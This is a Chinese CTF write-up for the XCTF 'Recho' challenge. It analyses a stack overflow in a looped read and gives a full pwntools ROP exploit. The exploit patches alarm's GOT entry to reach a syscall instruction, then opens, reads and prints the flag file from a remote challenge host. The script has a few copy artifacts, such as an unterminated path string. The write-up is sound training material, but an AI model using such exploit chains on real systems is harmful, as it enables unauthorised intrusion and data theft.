# Recho

题目来源：https://adworld.xctf.org.cn/task/

这道题目别看题面非常短，但是要想真正做出这道题很难。漏洞的利用很好找，但是能够真正直接利用漏洞非常困难。先简单看一下安全防护：

```
Arch:     amd64-64-little                                               
RELRO:    Partial RELRO                                                 
Stack:    No canary found                                               
NX:       NX enabled                                                      
PIE:      No PIE (0x400000)
```

看了防护措施应该是存在栈溢出的问题，接着看一下源代码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char nptr; // [rsp+0h] [rbp-40h]
  char buf[40]; // [rsp+10h] [rbp-30h]
  int v6; // [rsp+38h] [rbp-8h]
  int v7; // [rsp+3Ch] [rbp-4h]

  Init();
  write(1, "Welcome to Recho server!\n", 0x19uLL);
  while ( read(0, &nptr, 0x10uLL) > 0 )
  {
    v7 = atoi(&nptr);
    if ( v7 <= 15 )
      v7 = 16;
    v6 = read(0, buf, v7);
    buf[v6] = 0;
    printf("%s", buf);
  }
  return 0;
}
```

分析一下代码，首先循环输入最多 16 个字节的字符串数据，这个数据最终会被转换为数字，随后从标准输入中读入这么多个字符，然后输出。

代码逻辑非常简单，但是漏洞也非常明显，因为 buf 没有限制读入数据的多少，所以造成了栈溢出，而且可以覆盖返回地址来控制代码流程。不过由于在该文件中没有出现 system 等函数，所以先考虑能否泄露 libc。其实按照常理来说是可以实现的，可以使用 write 函数 再配合 got 表就可以解决，一开始也确实是这么思考的。

但是这道题的问题在于，由于循环输入的缘故，所以程序是无法正常走到 return 0 的。网上的说法是，在 pwntools 中有一个 shutdown 方法可以切断循环的过程，但是这意味着程序直接结束了。而泄露 libc 的方法是分两步的，所以在一次操作中无法完成。

因此这道题的目标就是需要在一次 ROP 中构造能够获取 flag 的代码。

----

那么这道题也是看了答案，觉得非常的巧妙，其实如果在一次构造中完成对 flag 的读写，过程应该如下：

```
fd = open("flag", READONLY)
read(fd, buf, cnt)
printf(buf)
```

如果能够构造以上流程，也就输出了最终的 flag。并且通过 IDA 的观察，也能够发现，在 data 区域是有 flag 字符串的，这是一个提示。

在该程序中已经有了 read 和 printf， 但是缺少 open。巧妙的是，由于 open 是系统调用，可以通过系统调用号来调用，即使用 system 指令，而 open 的调用号是 2(eax)。

获取 system 指令的方法也很特殊，这也是这个题目有又一个凑巧的地方。比如像 alarm 函数也是一个系统调用，所以其实在 libc 的源码中会用到 system 指令，一个想法是调用 alarm 的时候实际调用它的 system 指令，即让 alarm 的 got 表的内容指向函数中的 system 指令的位置。但是如何修改 got 表中的位置呢，在该程序中有这样的 gadget：

```
add byte ptr [rdi], al ; ret
```

如果此时 rdi 是 alarm 的 got 表中的内容，al 中存放的是 offset，那么就能顺利修改调用的指令位置，可以看到正确的 exp 如下：

```
from pwn import *                                                       
from LibcSearcher import *                                            
import time                                                
context.log_level = 'debug'                                           
filepath = "../../mnt/c/Users/lenovo/Desktop/773a2d87b17749b595ffb937b4d29936
elf = ELF(filepath)                                                     
alarm_got = elf.got["alarm"]                                                             alarm_plt = elf.plt["alarm"]                                       
read_plt = elf.plt["read"]                                        
printf_plt = elf.plt["printf"]                                    
pop_rdi = 0x004008a3                                           
pop_rsi_r15 = 0x004008a1                                           
pop_rdx = 0x004006fe                                                 
pop_rax = 0x004006fc                                            
add_rdi = 0x0040070d                                                
flag_str = 0x00601058                                                
buf = 0x00601090                                                                                                                                                
payload1 = 'a' * 0x38 
# 这里在修改 alarm 的 got
# 0x5 是偏移，system 指令在 alarm 函数向后偏移5个单位的地址处
payload1 += p64(pop_rax) + p64(0x5)      
payload1 += p64(pop_rdi) + p64(alarm_got)                                                 
payload1 += p64(add_rdi)
# 执行 open
payload1 += p64(pop_rax) + p64(0x2)                        
payload1 += p64(pop_rdi) + p64(flag_str)                         
payload1 += p64(pop_rdx) + p64(0)                               
payload1 += p64(pop_rsi_r15) + p64(0) + p64(0)                    
payload1 += p64(alarm_plt)                                                               # 执行 read
payload1 += p64(pop_rdi) + p64(0x3)                      
payload1 += p64(pop_rsi_r15) + p64(buf+0x500) + p64(0)            
payload1 += p64(pop_rdx) + p64(0x30)                              
payload1 += p64(read_plt)                                                                 # 执行 print
payload1 += p64(pop_rdi) + p64(buf+0x500) + p64(printf_plt)

conn = remote("220.249.52.133", 57906)               
print conn.recvuntil("Welcome to Recho server!\n")
#这里我吃了大亏，如果使用"0x200"而不是str(0x200)会不能通过atoi
conn.sendline(str(0x200))                        
payload1 = payload1.ljust(512, '\x00')      
conn.send(payload1)                                        
conn.recv()                                                     
conn.shutdown('send')                                            
conn.interactive()                                         
conn.close() 
```

